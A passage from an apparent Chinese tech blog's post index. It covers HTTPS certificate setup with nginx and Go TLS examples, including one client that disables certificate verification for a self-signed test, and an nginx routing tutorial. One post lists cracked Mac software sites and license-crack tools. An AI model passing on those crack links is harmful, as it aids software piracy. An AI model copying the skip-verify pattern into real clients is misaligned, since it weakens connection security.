一旦双方协商出对话密钥，则后续的数据通讯就会一直使用基于该对话密钥的对称加密算法了。(对称加密会加快速度)\n\n\n\n上述过程有一个问题，那就是双方握手过程中，如何保障HTTPS服务端发送给客户端的公钥信息没有被篡改呢？实际应用中，HTTPS并非直接传输公钥信息，而是使用携带公钥信息的数字证书来保证公钥的安全性和完整性。\n\n数字证书，又称互联网上的\"身份证\"，用于唯一标识一个组织或一个服务器的，这就好比我们日常生活中使用的\"居民身份证\"，用于唯一标识一个人。\n\n服务端将数字证书传输给客户端，客户端如何校验这个证书的真伪呢？我们知道居民身份证是由国家统一制作和颁发的，个人向户口所在地公安机关申请，国家颁发的身份证才具有法律效力，任何地方这个身份证都是有效和可被接纳的。\n\n网站的证书也是同样的道理。一般来说数字证书从受信的权威证书授权机构 (Certification Authority，证书授权机构)买来的（免费的很少）。一般浏览器在出厂时就内置了诸多知名CA（如Verisign、GoDaddy、美国国防部、 CNNIC等）的数字证书校验方法，只要是这些CA机构颁发的证书，浏览器都能校验。\n\n对于CA未知的证书，浏览器则会报错。主流浏览器都有证书管理功能，但鉴于这些功能比较高级，一般用户是不用去关心的。\n\n\n\n\n### 3. 让自己的网站支持 https\n\n+ 使用 Let’s Encrypt 提供的免费证书, 放到自己的服务器中, 并且在nginx配置好证书路径, 这样使用浏览器访问的时候就会见到熟悉的绿色小锁头了. 需要注意证书必须颁发给`某个域名`, 所以`ip地址`无效.\n\n+ 安装工具certbot\n\n```\ngit clone https://github.com/certbot/certbot\ncd certbot\nchmod +x certbot-auto\n\t\n# certbot-auto 即为自动化脚本工具, 他会判断你的服务是nginx还是apache, 然后执行对应逻辑\n./certbot-auto --help\n```\n\n+ 生成证书\n\n```bash\n# webroot代表webroot根目录模式, certonly代表只生成证书 邮箱亲测没啥大用, 域名一定要和自己要申请证书的域名一致\n./certbot-auto certonly --webroot --agree-tos -v -t --email 你的邮箱 -w 服务器根目录 -d 你要申请的域名\n\t\n\t\n# 实际如下\n./certbot-auto certonly --webroot --agree-tos -v -t --email levonfly@gmail.com -w /var/www/html/ -d a.xuanyueting.com\n```\n\n然后会在/etc/letsencrypt/目录下生成相关文件, 你所需要的证书其实在`/etc/letsencrypt/live/a.xuanyueting.com/`目录中.\n\n`fullchain.pem`可以看作是证书公钥, `privkey.pem`是证书私钥, 是我们下面需要使用到的两个文件\n\n\n+ nginx 配置支持 https\n\n```nginx\nserver {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n    rewrite ^ https://$http_host$request_uri? permanent;\n}\n\n\nserver {\n\t  listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;\n    ssl_certificate \"/etc/letsencrypt/live/a.xuanyueting.com/fullchain.pem\";\n    ssl_certificate_key \"/etc/letsencrypt/live/a.xuanyueting.com/privkey.pem\";\n    \n    root /var/www/html;\n    ....\n}\n```\n\n+ 重启 nginx 验证\n\t\n```bash\nsudo service nginx restart\n```\n访问 a.xuanyueting.com, 会发现出现了小绿锁\n\n\n\n### 4. freesn网站免费申请\n\n+ https://freessl.cn/ 注册账号\n\n+ 选择Let's Encrypt V2 支持通配符\n\n  ![1](https协议_网站支持https_通过golang启动https/1.png)\n\n+ 启动keymanager(需要下载), 设置一个密码\n\n+ 浏览器拉起keymanager, 会自动生成一个csr\n\n+ DNS 验证\n\n  ![1](https协议_网站支持https_通过golang启动https/2.png)\n\n  CA 将通过查询 DNS 的 TXT 记录来确定您对该域名的所有权。您只需要在域名管理平台将生成的 TXT 记录名与记录值添加到该域名下，等待大约 1 分钟即可验证成功。\n\n  \n\n  需要你到你的域名托管服务商那里添加一条 TXT 记录，其中记录名称为第二行的内容,记录值为第三行的内容。\n\n  ![1](https协议_网站支持https_通过golang启动https/3.png)\n\n+ 生成证书并且下载, 建议保存到key manager里\n\t![1](https协议_网站支持https_通过golang启动https/4.png)\n\n+ 保存到key manager里, 有效期3个月, 选择导出证书, nginx, 2个文件crt 和 key\n  ![1](https协议_网站支持https_通过golang启动https/5.png)\n  \n+ Nginx 配置\n\n  ```nginx\n  server {\n          listen 80 default_server;#一定要加上default_server,否则多个server会找第一个为默认\n          listen [::]:80 default_server;#监听所有的ipv6的地址\n          rewrite ^ https://$http_host$request_uri? permanent; #https 跳转到 https,永久重定向向\n  }\n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n          ssl_certificate \"/etc/nginx/ssl/*.liuvv.com_chain.crt\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com_key.key\";\n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n  \n\n### 5. acme自动生成并更新证书\n\n+ https://www.liuvv.com/p/ee822cec.html\n\n\n\n### 6. golang 实现一个最简单的HTTPS Web Server\n\n+ 生成私钥和证书\n\n```\nopenssl genrsa -out server.key 2048 //生成私钥\nopenssl req -new -x509 -key server.key -out server.pem -days 3650 //生成证书\n```\n\n+ server.go\n\n```\npackage main\n\t\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServeTLS(\":8081\", \"server.pem\", \"server.key\", nil)\n}\n\t\n```\n\n通过浏览器访问：https://localhost:8081 会出现您的连接不是私密连接, 因为我们使用的是自签发的数字证书\n\t\n\n+ 客户端访问\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t//通过设置tls.Config的InsecureSkipVerify为true，client将不再对服务端的证书进行校验。\n\tts := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}} \n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n### 对服务端数字证书进行验证\n\n接下来我们来验证一下客户端对服务端数字证书进行验证:\n\n- 首先我们来建立我们自己的CA，需要生成一个CA私钥和一个CA的数字证书:\n\t\n```\nopenssl genrsa -out ca.key 2048\n\t\nopenssl req -x509 -new -nodes -key ca.key -subj \"/CN=tonybai.com\" -days 5000 -out ca.crt\n```\n\n- 接下来，生成server端的私钥，生成数字证书请求，并用我们的ca私钥签发server的数字证书：\n\n```\nopenssl genrsa -out server.key 2048\n\t\nopenssl req -new -key server.key -subj \"/CN=localhost\" -out server.csr\n\t\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 5000\n```\n\n- 现在我们的工作目录下有如下一些私钥和证书文件：\n\n```\nCA:\n私钥文件 ca.key\n数字证书 ca.crt\n\nServer:\n私钥文件 server.key\n数字证书 server.crt\n```\n\n+ 客户端验证服务端数字证书\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool,\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n### 对客户端的证书进行校验(双向证书校验）\n\n+ 要对客户端数字证书进行校验，首先客户端需要先有自己的证书。\n\n```\nopenssl genrsa -out client.key 2048\n\t\nopenssl req -new -key client.key -subj \"/CN=tonybai_cn\" -out client.csr\n\t\nopenssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 5000\n```\n\n+ 首先server端需要要求校验client端的数字证书，并且加载用于校验数字证书的ca.crt，因此我们需要对server进行更加灵活的控制：\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\ts := &http.Server{\n\t\tAddr:    \":8081\",\n\t\tHandler: http.HandlerFunc(handler),\n\t\tTLSConfig: &tls.Config{\n\t\t\tClientCAs:  pool,\n\t\t\tClientAuth: tls.RequireAndVerifyClientCert, //强制校验client端证书\n\t\t},\n\t}\n\t\n\ts.ListenAndServeTLS(\"server.crt\", \"server.key\")\n}\n```\n\n+ client端变化也很大，需要加载client.key和client.crt用于server端连接时的证书校验：\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tcliCrt, err := tls.LoadX509KeyPair(\"client.crt\", \"client.key\")\n\tif err != nil {\n\t\tfmt.Println(\"Loadx509keypair err:\", err)\n\t\treturn\n\t}\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool, //client端是 RootCAs\n\t\t\tCertificates:       []tls.Certificate{cliCrt},\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```","tags":["http"],"categories":["https"]},{"title":"Mac破解资源软件收集","url":"%2Fp%2F6765e5a5.html","content":"\n\n\n+ 苹果软件破解 https://xclient.info/\n\n+ 苹果软件破解 https://www.waitsun.com/\n\n+ 苹果软件破解 https://www.macenjoy.co/\n\n+ 苹果软件破解 https://www.macsky.net/\n\n+ 苹果软件破解 https://macbold.com/\n\n+ 苹果软件破解 https://www.naodai.org/\n\n  <!-- more -->\n\n+ 百度云盘破解 https://github.com/proxyee-down-org/proxyee-down\n\n+ 百度云盘破解 https://www.baiduwp.com/ (需要安装ua switch插件,已失效)\n\n+ 百度云盘破解 https://github.com/b3log/baidu-netdisk-downloaderx(已失效)\n\n+ Jetbrains https://zhile.io/2018/08/25/jetbrains-license-server-crack.html\n\n+ Charles 破解  https://github.com/8enet/Charles-Crack\n\n+ cleanmymac 破解 https://macbold.com/download-cleanmymac-fully-activated-free7t5/\n\n+ ntfsformac破解 https://www.naodai.org/archives/50.html\n\n+ 小众软件: https://www.appinn.com/category   里面有比较有意思的软件和chrome插件\n\n\n\n","tags":["software"],"categories":["软件"]},{"title":"nginx的location用法和rewrite规则及proxy_pass模块","url":"%2Fp%2F51e59d76.html","content":"\n\n\n### 1. location指令\n\n根据请求的URI来设置具体规则, URI是url中除去协议\b和域名及参数后, 剩下的部分.\n\n比如请求的url为: http://www.liuvv.com/test/index.php?page=1, 则uri 为 `/test/index.php`\n\n##### 1.1 location匹配uri的规则:\n\n```\nlocation [ = | ~ | ~* | ^~ ] uri { ... }\n```\n\n+ `=`  精确匹配, uri要完全一样\n+ `^~`  这个是以某个开头, 不是正则匹配\n+ `~`  区分大小写正则匹配\n+ `~*` 不区分大小写正则匹配\n\n\n\n<!-- more -->\n\n##### 1.2 location匹配uri的优先级:\n\n1. 首先先检查使用前缀字符定义的location，选择最长匹配的项并记录下来。\n\n2. 如果找到了精确匹配的location，也就是使用了`=`修饰符的location，结束查找，使用它的配置。\n\n3. 如果`^~`修饰符先匹配到最长的前缀字符串, 则不检查正则。\n\n4. 然后按顺序查找使用正则定义的location，如果匹配则停止查找，使用它定义的配置。\n\n5. 如果没有匹配的正则location，则使用前面记录的最长匹配前缀字符location。\n\n   \n\n> 基于以上的匹配过程，我们可以得到以下启示：\n\n1. 使用正则定义的location在配置文件中出现的顺序很重要。因为找到第一个匹配的正则后，查找就停止了，后面定义的正则就是再匹配也没有机会了。\n2. 使用精确匹配可以提高查找的速度。例如经常请求`/`的话，可以使用`=`来定义location。\n3. 优先级 `=`  >  `^~`  >  正则\n\n\n\n##### 1.3 \u0010location 测试\n\n```nginx\nlocation = / {\n  return 502 \"规则A\\n\";\n}\nlocation = /login {\n  return 502 \"规则B\\n\";\n}\nlocation ^~ /static/ {\n  return 502 \"规则C\\n\";\n}\nlocation ^~ /static/files {\n  return 502 \"规则D\\n\";\n}\nlocation ~ \\.(gif|jpg|png|js|css)$ {\n  return 502 \"规则E\\n\";\n}\nlocation ~* \\.PNG$ {\n  return 502 \"规则F\\n\";\n}\nlocation /img {\n  return 502 \"规则G\\n\";\n}\nlocation / {\n  return 502 \"规则H\\n\";\n}\n```\n\n测试结果:\n\n```bash\nlevonfly@hk:~$ curl test.liuvv.com # 因为是=\n规则A\nlevonfly@hk:~$ curl test.liuvv.com/ # 因为是=\n规则A\nlevonfly@hk:~$ curl test.liuvv.com/login # 因为是=\n规则B\nlevonfly@hk:~$ curl test.liuvv.com/login/ # 多了/, 参考下面3.5\n规则H\nlevonfly@hk:~$ curl test.liuvv.com/abc\n规则H\n\nlevonfly@hk:~$ curl test.liuvv.com/static/a.html \n规则C\nlevonfly@hk:~$ curl test.liuvv.com/static/files/a.html # 更加精准\n规则D\n\nlevonfly@hk:~$ curl test.liuvv.com/a.png # 正则精准\n规则E\nlevonfly@hk:~$ curl test.liuvv.com/a.PNG # 正则精准\n规则F\nlevonfly@hk:~$ curl test.liuvv.com/static/a.png # ^~ 优先级更高\n规则C\n\nlevonfly@hk:~$ curl test.liuvv.com/img/a.gif #正则匹配优先\n规则E\nlevonfly@hk:~$ curl test.liuvv.com/img/a.tiff\n规则G\nlevonfly@hk:~$ curl test.liuvv.com/abc/123/haha #什么都匹配不到, 就到H\n规则H\n```\n\n\n\n##### 1.4 location @name的用法\n\n@用来定义一个命名location。主要用于内部重定向，不能用来处理正常的请求。其用法如下：\n\n```nginx\nlocation / {\n    try_files $uri $uri/ @custom\n}\nlocation @custom {\n    # ...do something\n}\n```\n\n上例中，当尝试访问url找不到对应的文件就重定向到我们自定义的命名location（此处为custom）。\n\n值得注意的是，命名location中不能再嵌套其它的命名location。\n\n\n\n\n##### 1.5 root和alias的区别\n\nnginx指定文件路径有两种方式root和alias.\n\n- root\n\n```\n[root]\n语法：root path\n默认值：root html\n配置段：http、server、location、if\n```\n\n例如:\n\n```nginx\nlocation ^~ /t/ { \n     root /www/root/html/;\n}\n```\n\n如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/t/a.html的文件。\n\n- alias\n\n```\n[alias]\n语法：alias path\n配置段：location\n```\n\n例如:\n\n```nginx\nlocation ^~ /t/ { # 特殊的规则是, alias必须以\"/\" 结束\n alias /www/root/html/new_t/;\n}\n```\n\n如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/new_t/a.html的文件。注意这里是new_t，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。\n\n\n\n##### 1.6 nginx显示目录结构\n\nnginx默认是不允许列出整个目录的。如需此功能, 在server或location 段里添加上autoindex on;\n\n```nginx\nautoindex_exact_size off;\n默认为on，显示出文件的确切大小，单位是bytes。\n改为off后，显示出文件的大概大小，单位是kB或者MB或者GB\n\nautoindex_localtime on;\n默认为off，显示的文件时间为GMT时间。\n改为on后，显示的文件时间为文件的服务器时间\n```\n\n可以下面的例子:\n\n```nginx\nlocation ^~ \"/upload-preview\" {\n\t\talias /tmp/cistern/;\n\t\tautoindex on;\n\t\tautoindex_localtime on;\n}\n```\n\n\n\n##### 1.7 URL尾部的`/`需不需要\n\n关于URL尾部的`/`有三点也需要说明一下。第一点与location配置有关，其他两点无关。\n\n+ location配置中的字符有没有`/`都没有影响(只是location, 不是alias)。也就是说`/user/`和`/user`是一样的。\n\n+ 如果URL结构是`https://domain.com/`的形式，尾部有没有`/`都不会造成重定向。因为浏览器在发起请求的时候，默认加上了`/`。虽然很多浏览器在地址栏里也不会显示`/`。这一点，可以访问[baidu](https://www.baidu.com/)验证一下。\n\n+ 如果URL的结构是`https://domain.com/some-dir/`。尾部如果缺少`/`将导致重定向。因为根据约定，URL尾部的`/`表示目录，没有`/`表示文件。\n\n  所以访问`/some-dir/`时，服务器会自动去该目录下找对应的默认文件。如果访问`/some-dir`的话，服务器会先去找`some-dir`文件，找不到的话会将`some-dir`当成目录，重定向到`/some-dir/`，去该目录下找默认文件。\n\n\n\n### 2. rewirte规则\n\n\n##### 2.1 return指令\n\nreturn指令写在server和location里面\n\n```nginx\nreturn code [text];\nreturn code URL;\nreturn URL;\n```\n\n我们来看下面这个例子\n\n```nginx\n return 301 $scheme://www.baidu.com$request_uri; \n```\n\nreturn 指令告诉 nginx 停止处理请求, 直接返回301代码和指定\b重写过的URL到客户端. $scheme是指\b协议(http),$request_uri指\b包含参数的完整URI \n\n\n\n对于 3xx 系列响应码, url参数就是重写的url\n\n```nginx\nreturn (301 | 302 | 303 | 307) url;\n```\n\n对于其他响应吗, 可以出现一个字符串\n\n```nginx\nreturn (1xx | 2xx | 4xx | 5xx)[\"text\"]\n```\n\n例如:\n\n```nginx\nreturn 401 \"Access denied because token is expired or invalid\";\n```\n\n\n\n##### 2.2 rewrite指令\n\nrewrite指令写在server和location里面, 规则会改变部分或整个用户的URL.\n\n```nginx\nrewrite regex URL [flag]\n```\n\n1. regex 正则表达式\n\n2. flag\n\n   + last\n\n     停止当前这个请求，并根据rewrite匹配的规则重新发起一个请求。新请求又从第一阶段开始执行, 找寻新的location\n\n   + break\n\n     break并不会重新发起一个请求，只是跳过当前的rewrite阶段，并执行本请求后续的执行阶段, 在同一个location里处理\n\n   + redirect\n\n     返回包含302的临时重定向\n\n   + permanent\n\n     返回包含301的永久重定向\n\n3. rewrite只能返回301或302, 如果有其他,需要后面加上return, 例如:\n\n```nginx\nrewrite ^(/download/.*)/media/(\\w+)\\.?.*$ $1/mp3/$2.mp3 last;\nrewrite ^(/download/.*)/audio/(\\w+)\\.?.*$ $1/mp3/$2.ra  last;\nreturn  403;\n```\n\n+ 匹配/download开头的URL,  然后替换相关路径\n+ `/download/cdn-west/media/file1` -> `/download/cdn-west/mp3/file1.mp3`\n\n+ 如果匹配不上, 将返回客户端403\n\n\n\n##### 2.3 try_files\n\ntry_files指令写在server和location里面.\n\n```nginx\nry_files file ... uri 或 try_files file ... = code\n```\n\ntry_files 指令的参数是一个或多个文件或目录的列表, 以及后面的uri参数. nginx会按照顺序检查文件或目录是否存在, 并用找到的第一个文件提供服务. 如果都不存在, 内部重定向到最后的这个uri\n\n例如:\n\n```nginx\nlocation /images/ {\n    try_files $uri $uri/ /images/default.gif;\n}\n\nlocation = /images/default.gif {\n    expires 30s;\n}\n```\n\ntry_files常用的变量:\n\n+ $uri 表示域名以后的部分\n\n+ $args  请求url中 ? 后面的参数 (不包括?本身)\n\n+ $is_args  判断$args是否为空\n\n  ```nginx\n  try_files $uri $uri/ /index.php$is_args$args; #这样就能避免多余的?号\n  ```\n  \n+ $query_string 和 $args相同\n\n+ $document_root root指令指定的值\n\n+ $request_filename 请求的文件路径\n\n+ $request_uri 原始请求uri  \n\n\n\n我们看个例子:\n\n```nginx\ntry_files /app/cache/ $uri @fallback; \nindex index.php index.html;\n```\n\n它将检测$document_root/app/cache/index.php,$document_root/app/cache/index.html 和 $document_root$uri是否存在，如果不存在着内部重定向到@fallback(＠表示配置文件中预定义标记点) 。\n\n你也可以使用一个文件或者状态码(=404)作为最后一个参数，如果是最后一个参数是文件，那么这个文件必须存在。\n\n\n\n我们来看一个错误:\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri;\n}\n```\n\n原意图是访问`http://example.com/test.jpg`时先去检查`/web/wwwroot/static/test.jpg`是否存在，不存在就取`/web/wwwroot/test.jpg`\n\n但由于最后一个参数是一个内部重定向，所以并不会检查`/web/wwwroot/test.jpg`是否存在，只要第一个路径不存在就会重新向然后再进入这个location造成死循环。结果出现500 Internal Server Error\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri 404;\n}\n```\n\n这样才会先检查`/web/wwwroot/static/test.jpg`是否存在，不存在就取`/web/wwwroot/test.jpg`再不存在则返回404 not found\n\n\n\n##### 2.4 if指令\n\nif不是系统级的指令, 是和rewrite配合的. if 必须写在server和location里面.\n\n- 变量名:   如果是空字符串或\"0\"为FALSE\n- = 判断相等, != 判断不相等\n- ~ 和 ~*(不分区大小写) 将变量与正则匹配, 捕获可以用 $1 到 $9\n- !~ 和 !~* 用作不匹配运算符\n- 正则含有 } 或 ; 字符需要用引号括起来\n- 常用判断指令\n  - -f 和 !-f 判断是否存在文件(file)\n  - -d 和 !-d 判断是否存在目录(directory)\n  - -e 和 !-e 判断是否存在文件或目录(exists)\n  - -x 和 !-x 判断文件是否可执行(execute)\n\n\n\n例如下面的列子:\n\n```nginx\nif ($http_user_agent ~ Chrome) {\n    rewrite ^([^/]*)$ /chrome$1 break;\n}\n\nif ($request_method = POST){\n    return 405;\n}\n\nif (-f $request_filename) {\n    expires max;\n    break;\n}\n```\n\n\n\n### 3. proxy_pass模块\n\nproxy_pass指令是将请求反向代理到URL参数指定的服务器上，URL可以是主机名或者IP地址+端口号的形式，例如：\n\n```\nproxy_pass http://proxy_server;\nproxy_pass http://192.168.9.2:8000;\nproxy_pass https://192.168.9.2:8000;\n```\n\nproxy_pass模块基本配置： \n+ proxy_set_header：设置服务器获取用户的主机名或者真实ip地址，以及代理者的真实ip地址。 \n+ client_body_buffer_size：用于指定客户端请求主体缓冲区大小，可以理解为先保存到本地再传给用户 \n+ proxy_connect_timeout：表示连接服务器的超时时间，即发起tcp握手等候响应的超时时间 \n+ proxy_send_time：服务器的数据传回时间，在规定时间内服务器必须传回完所有数据，否则，nginx将断开这个连接 \n+ proxy_read_time：设置nginx从代理的后端服务器获取数据的时间，表示连接建立成功后，+ nginx等待服务器的响应时间，其实是nginx已经进入服务器的排队中等候处理的时间。 \n+ proxy_buffer_size：设置缓冲区大小，默认该缓冲区大小等于proxy_buffers设置的大小 \n+ proxy_buffers：设置缓冲区的数量和大小，nginx从代理的服务器获取响应数据会放置到缓冲区 \n+ proxy_busy_buffers_size：用于设置系统很忙时可以使用的proxy_buffers大小，官方推荐大小为proxy_buffers*2 \n+ proxy_temp_file_write_size：指定proxy缓存临时文件的大小\n\n\n\n##### 3.1 proxy_set_header\n\n```bash\n语法:    proxy_set_header field value;\n默认值:    \nproxy_set_header Host $proxy_host; # 注意这个是proxy_host\nproxy_set_header Connection close;\n\n\n上下文:    http, server, location\n```\n\n允许重新定义或者添加发往后端服务器的请求头。value可以包含文本、变量或者它们的组合。 当且仅当当前配置级别中没有定义proxy_set_header指令时，会从上面的级别继承配置。默认情况下，只有两个请求头会被重新定义：\n\n```nginx\nproxy_set_header Host       $proxy_host;\nproxy_set_header Connection close;\n```\n\n\n\nproxy_set_header也可以自定义参数，如：proxy_set_header test paroxy_test;\n\n如果想要支持下划线的话，需要增加如下配置：`underscores_in_headers on`; \n\n```bash\n语法：underscores_in_headers on|off\n默认值：off\n使用字段：http, server\n是否允许在header的字段中带下划线\n```\n\n\n\n##### 3.2 遇到的问题\n\n> 经过反向代理后，由于在客户端和web服务器之间增加了中间层，因此web服务器无法直接拿到客户端的ip, 通过$remote_addr变量拿到的将是反向代理服务器的ip地址. 如果我们想要在web端获得用户的真实ip，就必须在nginx这里作一个赋值操作，如下：\n\n```nginx\nproxy_set_header            X-real-ip $remote_addr;\n```\n\n其中这个X-real-ip是一个自定义的变量名，名字可以随意取，这样做完之后，用户的真实ip就被放在X-real-ip这个变量里了，然后，在web端可以这样获取：request.getAttribute(\"X-real-ip\")\n\n\n\n>  通常我们会看到有这样一些配置:\n\n```\nserver {\n        server_name liuwei.fhyx.com;\n\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_redirect         off;\n        proxy_http_version     1.1;\n        proxy_set_header       Upgrade $http_upgrade;\n        proxy_set_header       Connection \"upgrade\";\n        proxy_buffering        off;\n\n        location / {\n                proxy_pass     http://127.0.0.1:8000;\n        }\n\n        location ~ \"/(box|c|bub)/\" {\n                proxy_pass     http://127.0.0.1:8081;\n        }\n\n        location ~ /(a|o2)/ {\n                proxy_pass     http://127.0.0.1:3010;\n        }\n\n        location ~ \"/api/(v\\d{1,2})/\" {\n                proxy_pass     http://127.0.0.1:5010;\n        }\n\n}\n```\n\n##### proxy_set_header   X-real-ip $remote_addr;\n\n这句话之前已经解释过，有了这句就可以在web服务器端获得用户的真实ip, 但是，实际上要获得用户的真实ip，不是只有这一个方法。\n\n##### proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n\nX-Forwarded-For 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 [RFC 7239](http://tools.ietf.org/html/rfc7239)（Forwarded HTTP Extension）标准之中。\n\nX-Forwarded-For 请求头格式非常简单，就这样：\n\n```bash\nX-Forwarded-For: client, proxy1, proxy2\n```\n\n可以看到，XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP。\n\n 如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：\n\n  ```bash\nX-Forwarded-For: IP0, IP1, IP2\n  ```\n\nProxy3 直连服务器，它会给 XFF 追加 IP2，表示它是在帮 Proxy2 转发请求。列表中并没有 IP3，IP3 可以在服务端通过 Remote Address 字段获得。我们知道 HTTP 连接基于 TCP 连接，HTTP 协议中没有 IP 的概念，Remote Address 来自 TCP 连接，表示与服务端建立 TCP 连接的设备 IP，在这个例子里就是 IP3。\n\nRemote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求。不同语言获取 Remote Address 的方式不一样，例如 php 是 `$_SERVER[\"REMOTE_ADDR\"]`，Node.js 是 `req.connection.remoteAddress`，但原理都一样。\n\n对于 Web 应用来说，`X-Forwarded-For` 和 `X-Real-IP` 就是两个普通的请求头，自然就不做任何处理原样输出了。这说明，对于直连部署方式，除了从 TCP 连接中得到的 Remote Address 之外，请求头中携带的 IP 信息都不能信。  \n\n##### proxy_set_header       Host $http_host;\n\n- $host：请求中的主机头(HOST)字段，如果请求中的主机头不可用或者空，则为处理请求的server名称(处理请求的server的server_name指令的值)。值为小写，不包含端口!!!!\n\n- 如果客户端发过来的请求的header中有’HOST’这个字段时，`$http_host`和`$host`都是原始的’HOST’字段比如请求的时候HOST的值是www.csdn.net 那么反代后还是www.csdn.net\n  \n  如果客户端发过来的请求的header中没有有’HOST’这个字段时， 建议使用$host，这表示请求中的server name。\n  \n\n\n\n### 4. websocket反向代理\n\n+ nginx 首先确认版本必须是1.3以上。\n\n+ map指令的作用： 该作用主要是根据客户端请求中$http_upgrade的值，来构造改变$connection_upgrade的值，即根据变量$http_upgrade的值创建新的变量$connection_upgrade， 创建的规则就是{}里面的东西。其中的规则没有做匹配，因此使用默认的，即 $connection_upgrade的值会一直是 upgrade。然后如果 $http_upgrade为空字符串的话， 那值会是 close。\n\n```nginx\n#必须添加的\nmap $http_upgrade $connection_upgrade {\n        default upgrade;\n        '' close;\n}\n\nupstream websocket {\n    ip_hash;\n    #转发到服务器上相应的ws端口\n    server localhost:3344;\n    server localhost:8011;\n}\nserver {\n    listen 80;\n    server_name a.liuvv.com;\n    location / {\n    \n        #转发到http://websocket\n        proxy_pass http://websocket;\n        proxy_read_timeout 300s;\n        proxy_send_timeout 300s;\n\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    \n        #升级http1.1到 websocket协议  \n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection  $connection_upgrade;\n    }\n}\n```\n\n\n\n\n\n### 5. 参考资料:\n\n+ https://nginx.org/en/docs/\n+ [Nginx配置location、if以及return、rewrite和 try_files 指令](https://www.xiebruce.top/710.html)\n+ [Nginx 基本功能 - 将 Nginx 配置为 Web 